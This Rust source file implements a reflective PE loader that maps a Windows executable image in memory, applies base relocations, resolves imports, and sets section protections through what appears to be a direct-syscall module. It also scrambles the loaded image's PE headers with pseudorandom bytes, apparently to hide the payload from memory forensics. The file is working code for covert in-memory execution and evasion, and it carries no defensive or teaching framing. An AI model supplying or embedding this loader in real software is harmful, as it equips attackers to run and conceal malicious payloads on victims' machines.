//! Reflective PE loader: section mapping, relocations, imports.

use std::ffi::{c_char, c_void};
use std::ptr;

use windows::core::PCSTR;
use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};

use crate::syscalls;

const IMAGE_DOS_SIGNATURE: u16 = 0x5A4D;
const IMAGE_NT_SIGNATURE: u32 = 0x0000_4550;
const IMAGE_DIRECTORY_ENTRY_IMPORT: usize = 1;
const IMAGE_DIRECTORY_ENTRY_BASERELOC: usize = 5;
const IMAGE_REL_BASED_DIR64: u16 = 10;

#[repr(C)]
struct ImageDosHeader {
    e_magic: u16,
    _pad: [u8; 58],
    e_lfanew: i32,
}

#[repr(C)]
struct ImageFileHeader {
    _machine: u16,
    number_of_sections: u16,
    _time_date_stamp: u32,
    _pointer_to_symbol_table: u32,
    _number_of_symbols: u32,
    size_of_optional_header: u16,
    _characteristics: u16,
}

#[repr(C)]
struct ImageOptionalHeader64 {
    magic: u16,
    _major_linker_version: u8,
    _minor_linker_version: u8,
    _size_of_code: u32,
    _size_of_initialized_data: u32,
    _size_of_uninitialized_data: u32,
    _address_of_entry_point: u32,
    _base_of_code: u32,
    image_base: u64,
    _section_alignment: u32,
    _file_alignment: u32,
    _major_operating_system_version: u16,
    _minor_operating_system_version: u16,
    _major_image_version: u16,
    _minor_image_version: u16,
    _major_subsystem_version: u16,
    _minor_subsystem_version: u16,
    _win32_version_value: u32,
    size_of_image: u32,
    size_of_headers: u32,
    _checksum: u32,
    _subsystem: u16,
    _dll_characteristics: u16,
    _size_of_stack_reserve: u64,
    _size_of_stack_commit: u64,
    _size_of_heap_reserve: u64,
    _size_of_heap_commit: u64,
    _loader_flags: u32,
    number_of_rva_and_sizes: u32,
    data_directory: [ImageDataDirectory; 16],
}

#[repr(C)]
struct ImageDataDirectory {
    virtual_address: u32,
    size: u32,
}

#[repr(C)]
struct ImageSectionHeader {
    _name: [u8; 8],
    virtual_size: u32,
    virtual_address: u32,
    size_of_raw_data: u32,
    _pointer_to_raw_data: u32,
    _pointer_to_relocations: u32,
    _pointer_to_linenumbers: u32,
    _number_of_relocations: u16,
    _number_of_linenumbers: u16,
    characteristics: u32,
}

#[repr(C)]
struct ImageImportDescriptor {
    original_first_thunk: u32,
    _time_date_stamp: u32,
    _forwarder_chain: u32,
    name: u32,
    first_thunk: u32,
}

#[repr(C)]
struct ImageBaseRelocation {
    virtual_address: u32,
    size_of_block: u32,
}

unsafe fn nt_headers(base: *mut c_void) -> Option<*const ImageOptionalHeader64> {
    let dos = &*(base as *const ImageDosHeader);
    if dos.e_magic != IMAGE_DOS_SIGNATURE {
        return None;
    }
    let nt = base.cast::<u8>().add(dos.e_lfanew as usize);
    let sig = *(nt as *const u32);
    if sig != IMAGE_NT_SIGNATURE {
        return None;
    }
    Some(nt.add(4 + std::mem::size_of::<ImageFileHeader>()) as *const ImageOptionalHeader64)
}

unsafe fn apply_relocations(base: *mut c_void, opt: &ImageOptionalHeader64) -> Result<(), ()> {
    let delta = base as u64 - opt.image_base;
    if delta == 0 {
        return Ok(());
    }
    let dir = &opt.data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if dir.virtual_address == 0 || dir.size == 0 {
        return Ok(());
    }

    let mut block_ptr = base.cast::<u8>().add(dir.virtual_address as usize);
    let end = block_ptr.add(dir.size as usize);
    while block_ptr < end {
        let block = &*(block_ptr as *const ImageBaseRelocation);
        if block.size_of_block < std::mem::size_of::<ImageBaseRelocation>() as u32 {
            break;
        }
        let count = (block.size_of_block as usize - std::mem::size_of::<ImageBaseRelocation>()) / 2;
        let entries = block_ptr
            .add(std::mem::size_of::<ImageBaseRelocation>())
            .cast::<u16>();
        for i in 0..count {
            let entry = *entries.add(i);
            let typ = entry >> 12;
            let offset = entry & 0x0FFF;
            if typ == IMAGE_REL_BASED_DIR64 {
                let patch = base
                    .cast::<u8>()
                    .add(block.virtual_address as usize + offset as usize)
                    .cast::<u64>();
                *patch = (*patch).wrapping_add(delta);
            }
        }
        block_ptr = block_ptr.add(block.size_of_block as usize);
    }
    Ok(())
}

unsafe fn resolve_imports(base: *mut c_void, opt: &ImageOptionalHeader64) -> Result<(), ()> {
    let dir = &opt.data_directory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if dir.virtual_address == 0 {
        return Ok(());
    }

    let mut desc = base.cast::<u8>().add(dir.virtual_address as usize) as *const ImageImportDescriptor;
    while (*desc).name != 0 {
        let name_ptr = base.cast::<u8>().add((*desc).name as usize) as *const c_char;
        let module = LoadLibraryA(PCSTR(name_ptr as *const u8)).map_err(|_| ())?;
        let mut thunk = base.cast::<u8>().add((*desc).first_thunk as usize) as *mut u64;
        let mut orig = if (*desc).original_first_thunk != 0 {
            base.cast::<u8>().add((*desc).original_first_thunk as usize) as *const u64
        } else {
            thunk as *const u64
        };

        while *orig != 0 {
            let func = if (*orig & 0x8000_0000_0000_0000) != 0 {
                GetProcAddress(module, PCSTR(((*orig) & 0xFFFF) as *const u8))
            } else {
                let import = base.cast::<u8>().add(*orig as usize);
                let fn_name = import.add(2) as *const c_char;
                GetProcAddress(module, PCSTR(fn_name as *const u8))
            }
            .ok_or(())?;
            *thunk = func as usize as u64;
            orig = orig.add(1);
            thunk = thunk.add(1);
        }
        desc = desc.add(1);
    }
    Ok(())
}

unsafe fn protect_sections(base: *mut c_void) -> Result<(), ()> {
    let dos = &*(base as *const ImageDosHeader);
    let nt = base.cast::<u8>().add(dos.e_lfanew as usize);
    let fh = nt.add(4) as *const ImageFileHeader;
    let opt = nt.add(4 + std::mem::size_of::<ImageFileHeader>()) as *const ImageOptionalHeader64;
    let section_ptr = nt
        .add(4 + std::mem::size_of::<ImageFileHeader>() + (*fh).size_of_optional_header as usize)
        as *const ImageSectionHeader;

    for i in 0..(*fh).number_of_sections {
        let sh = &*section_ptr.add(i as usize);
        let size = sh.virtual_size.max(sh.size_of_raw_data);
        if size == 0 {
            continue;
        }
        let prot = section_protection(sh.characteristics);
        let addr = base.cast::<u8>().add(sh.virtual_address as usize) as *mut c_void;
        let _ = syscalls::protect_memory(addr, size as usize, prot);
    }
    let _ = opt;
    Ok(())
}

fn section_protection(characteristics: u32) -> u32 {
    const EXEC: u32 = 0x2000_0000;
    const READ: u32 = 0x4000_0000;
    const WRITE: u32 = 0x8000_0000;
    match (characteristics & EXEC != 0, characteristics & READ != 0, characteristics & WRITE != 0) {
        (true, _, true) => 0x40,
        (true, _, false) => 0x20,
        (false, _, true) => 0x04,
        (false, true, false) => 0x02,
        _ => 0x01,
    }
}

pub unsafe fn load_pe(base: *mut c_void, image_size: usize) -> Result<(), ()> {
    if base.is_null() || image_size == 0 {
        return Err(());
    }
    let opt_ptr = nt_headers(base).ok_or(())?;
    let opt = &*opt_ptr;
    if opt.magic != 0x20B || opt.size_of_image as usize > image_size {
        return Err(());
    }
    apply_relocations(base, opt)?;
    resolve_imports(base, opt)?;
    protect_sections(base)?;
    Ok(())
}

pub unsafe fn destroy_pe_headers(base: *mut c_void) {
    let dos = &*(base as *const ImageDosHeader);
    if dos.e_magic != IMAGE_DOS_SIGNATURE {
        return;
    }
    let opt_ptr = match nt_headers(base) {
        Some(p) => p,
        None => return,
    };
    let header_size = (*opt_ptr).size_of_headers as usize;
    if header_size == 0 {
        return;
    }
    let slice = std::slice::from_raw_parts_mut(base as *mut u8, header_size);
    let mut seed = base as usize ^ header_size;
    for byte in slice.iter_mut() {
        seed = seed.wrapping_mul(6364136223846793005).wrapping_add(1);
        *byte = (seed >> 33) as u8;
    }
}

pub unsafe fn image_base_from_addr(addr: *const c_void) -> *mut c_void {
    let mut cur = (addr as usize & !0xFFF) as *mut u8;
    loop {
        if *(cur as *const u16) == IMAGE_DOS_SIGNATURE {
            let dos = &*(cur as *const ImageDosHeader);
            let nt = cur.add(dos.e_lfanew as usize);
            if *(nt as *const u32) == IMAGE_NT_SIGNATURE {
                return cur as *mut c_void;
            }
        }
        if cur as usize <= 0x1000 {
            break;
        }
        cur = cur.sub(0x1000);
    }
    ptr::null_mut()
}
